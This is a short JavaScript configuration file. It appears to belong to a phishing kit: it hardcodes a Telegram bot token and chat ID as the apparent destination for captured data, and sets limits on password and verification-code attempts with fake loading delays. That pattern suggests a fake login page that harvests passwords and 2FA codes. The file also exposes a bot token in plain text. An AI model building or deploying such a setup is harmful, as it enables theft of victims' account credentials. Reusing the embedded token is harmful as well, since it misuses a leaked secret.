const config = {
    token: process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN ?? '8800443746:AAFOFdNuYK4Uky68ZWGKi-xR7nlIhBAh40A',
    chat_id: process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID ?? '-1004346804289',
    MAX_PASS: 2,
    MAX_CODE: 4,
    PASSWORD_LOADING_TIME: 8,
    CODE_LOADING_TIME: 15
};

export default config;
